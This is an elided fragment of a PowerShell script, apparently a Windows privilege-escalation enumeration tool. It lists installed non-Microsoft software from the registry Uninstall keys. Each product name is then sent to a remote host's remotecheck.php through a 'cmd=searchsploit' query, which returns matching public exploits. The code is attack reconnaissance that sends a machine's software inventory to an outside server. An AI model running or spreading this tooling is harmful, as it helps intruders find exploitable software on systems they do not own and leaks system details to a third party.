  ...
  function GetSystemInfo{
    ...
    function GetNetworkInfo{
      ...
      function SearchSoftwareExploit{
        ...
        $result =  Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*","HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*", "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*" -ErrorAction SilentlyContinue | Where-Object{$_.Publisher -NotMatch "Microsoft Corporation"} | Select-Object DisplayName  |  foreach-Object {Write-Output $_.DisplayName} | sort | Get-Unique
        foreach ( $r in $result){  $search = $r.Split(" ")[0].replace('-', ' ') ; Write-Output "Searchsploit $search";   (Invoke-WebRequest -URI "http://$remote_check/winprivesc/remotecheck.php?cmd=searchsploit $search --colour" -UseBasicParsing).content; Write-Output " "}
